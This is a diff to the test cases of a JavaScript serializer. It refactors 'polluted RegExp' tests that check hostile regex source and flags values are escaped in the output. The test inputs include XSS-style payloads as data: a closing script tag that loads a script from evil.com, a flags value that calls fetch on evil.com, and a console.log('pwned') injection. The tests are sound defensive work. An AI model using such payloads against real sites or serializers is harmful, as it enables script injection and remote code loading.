@@ -1134,6 +1134,11 @@ const cases: Record<string, Case[]> = {
       expected: { source: `{["__proto__"]:null}` },
     },
     {
+      name: `object with own constructor property`,
+      value: { constructor: { name: `RegExp` } },
+      expected: { source: `{constructor:{name:"RegExp"}}` },
+    },
+    {
       name: `object with copy of default prototype`,
       value: Object.create(
         Object.fromEntries(
@@ -1875,11 +1880,9 @@ const cases: Record<string, Case[]> = {
     },
     {
       name: `script polluted RegExp source`,
-      value: {
-        constructor: { name: `RegExp` },
-        source: `</script><script src='https://evil.com/hacked.js'>`,
-        flags: ``,
-      },
+      value: Object.defineProperty(/a/, `source`, {
+        value: `</script><script src='https://evil.com/hacked.js'>`,
+      }),
       expected: {
         source: `new RegExp("<\\u002fscript><script src='https://evil.com/hacked.js'>")`,
         roundtrips: false,
@@ -1889,11 +1892,9 @@ const cases: Record<string, Case[]> = {
       name: `console.log polluted RegExp source`,
       value: [
         1,
-        {
-          constructor: { name: `RegExp` },
-          source: `a/, console.log('pwned'), /a`,
-          flags: ``,
-        },
+        Object.defineProperty(/a/, `source`, {
+          value: `a/, console.log('pwned'), /a`,
+        }),
       ],
       expected: {
         source: `[1,new RegExp("a/, console.log('pwned'), /a")]`,
@@ -1902,13 +1903,7 @@ const cases: Record<string, Case[]> = {
     },
     {
       name: `polluted RegExp source with leading slash`,
-      value: (() => {
-        const value = new RegExp(`abc`)
-        Object.defineProperty(value, `source`, {
-          value: `/inject`,
-        })
-        return value
-      })(),
+      value: Object.defineProperty(/a/, `source`, { value: `/inject` }),
       expected: {
         source: `new RegExp("/inject")`,
         roundtrips: false,
@@ -1916,13 +1911,7 @@ const cases: Record<string, Case[]> = {
     },
     {
       name: `polluted RegExp source with trailing slash`,
-      value: (() => {
-        const value = new RegExp(`abc`)
-        Object.defineProperty(value, `source`, {
-          value: `inject/`,
-        })
-        return value
-      })(),
+      value: Object.defineProperty(/a/, `source`, { value: `inject/` }),
       expected: {
         source: `new RegExp("inject/")`,
         roundtrips: false,
@@ -1930,13 +1919,7 @@ const cases: Record<string, Case[]> = {
     },
     {
       name: `polluted RegExp source with multiple slashes`,
-      value: (() => {
-        const value = new RegExp(`abc`)
-        Object.defineProperty(value, `source`, {
-          value: `a/b/c`,
-        })
-        return value
-      })(),
+      value: Object.defineProperty(/a/, `source`, { value: `a/b/c` }),
       expected: {
         source: `new RegExp("a/b/c")`,
         roundtrips: false,
@@ -1946,13 +1929,7 @@ const cases: Record<string, Case[]> = {
       // Even number of backslashes before a slash means the slash is unescaped.
       // A real RegExp with a slash would have an odd number (e.g. `\/`).
       name: `polluted RegExp source with even backslashes before slash`,
-      value: (() => {
-        const value = new RegExp(`abc`)
-        Object.defineProperty(value, `source`, {
-          value: `\\\\/inject`,
-        })
-        return value
-      })(),
+      value: Object.defineProperty(/a/, `source`, { value: `\\\\/inject` }),
       expected: {
         source: `new RegExp("\\\\\\\\/inject")`,
         roundtrips: false,
@@ -1960,13 +1937,9 @@ const cases: Record<string, Case[]> = {
     },
     {
       name: `polluted RegExp flags`,
-      value: (() => {
-        const value = new RegExp(`abc`)
-        Object.defineProperty(value, `flags`, {
-          value: `+fetch('https://evil.com/hacked.js')`,
-        })
-        return value
-      })(),
+      value: Object.defineProperty(/abc/, `flags`, {
+        value: `+fetch('https://evil.com/hacked.js')`,
+      }),
       expected: {
         source: `new RegExp("abc","+fetch('https://evil.com/hacked.js')")`,
         roundtrips: false,
